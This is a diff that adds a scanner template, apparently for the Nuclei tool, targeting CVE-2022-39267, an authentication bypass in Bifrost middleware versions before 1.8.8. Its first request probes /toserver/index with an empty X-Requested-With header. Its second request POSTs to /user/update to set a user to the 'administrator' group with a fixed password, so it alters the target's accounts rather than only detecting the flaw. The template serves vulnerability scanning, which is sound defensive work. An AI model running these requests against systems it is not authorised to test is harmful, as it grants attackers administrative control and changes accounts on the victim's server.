@@ -1,0 +1,45 @@
+id: cve-2022-39267
+info:
+  name: Bifrost X-Requested-With Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Bifrost is a heterogeneous middleware that synchronizes MySQL, MariaDB to Redis, MongoDB, ClickHouse, MySQL and other services for production environments. Versions prior to 1.8.8-release are subject to authentication bypass in the admin and monitor user groups by deleting the X-Requested-With: XMLHttpRequest field in the request header. This issue has been patched in 1.8.8-release. There are no known workarounds.
+  reference:
+    - https://github.com/brokercap/Bifrost
+
+variables:
+  username: "user"
+  password: "password"
+
+http:
+  - raw:
+      - |
+        GET /toserver/index HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: 
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "ConnUri"
+  - raw:
+      - |
+        POST /user/update HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"UserName":"{{username}}","Password":"{{password}}","Group":"administrator","Host":""}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "{\"status\":1,\"msg\":\"success\",\"data\":null}"
